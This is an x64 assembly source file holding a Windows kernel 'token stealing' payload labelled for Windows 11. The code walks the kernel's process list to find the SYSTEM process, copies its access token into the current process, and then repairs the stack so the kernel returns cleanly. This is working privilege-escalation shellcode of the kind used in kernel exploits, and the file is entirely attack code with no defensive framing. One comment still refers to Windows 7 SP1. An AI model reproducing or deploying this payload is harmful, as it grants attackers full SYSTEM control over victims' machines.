
.code


TokenStealingPayloadWin11 PROC

;KTHREAD_OFFSET QWORD 188h
;EPROCESS_OFFSET QWORD 278h
;PID_OFFSET QWORD 440h
;FLINK_OFFSET QWORD 448h
;TOKEN_OFFSET QWORD 4B8h
;SYSTEM_PID QWORD 4h


push rax; Save registers state
push rbx;
push rcx;
push rdx;


; Start of Token Stealing Stub
xor rax, rax; Set ZERO
mov rax, gs:[rax + 188h] ; Get nt!_KPCR.PcrbData.CurrentThread _KTHREAD is located at GS : [0x188]

mov rax, [rax + 278h]; Get nt!_KTHREAD.ApcState.Process

mov rcx, rax; Copy current process _EPROCESS structure

mov rdx, 4h; WIN 7 SP1 SYSTEM process PID = 0x4

SearchSystemPID:

mov rax, [rax + 448h]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
sub rax, 448h;
cmp[rax + 440h], rdx; Get nt!_EPROCESS.UniqueProcessId
jne SearchSystemPID

mov rdx, [rax + 4B8h]; Get SYSTEM process nt!_EPROCESS.Token
mov[rcx + 4B8h], rdx; Replace target process nt!_EPROCESS.Token
; with SYSTEM process nt!_EPROCESS.Token
; End of Token Stealing Stub

pop rdx; Restore registers state
pop rcx;
pop rbx;
pop rax;


; Kernel Recovery Stub
xor rax, rax; Set NTSTATUS SUCCEESS
add rsp, 24;//12; Fix the stack
pop rbp; Restore saved EBP
ret 16; //8; Return cleanly

TokenStealingPayloadWin11 ENDP

END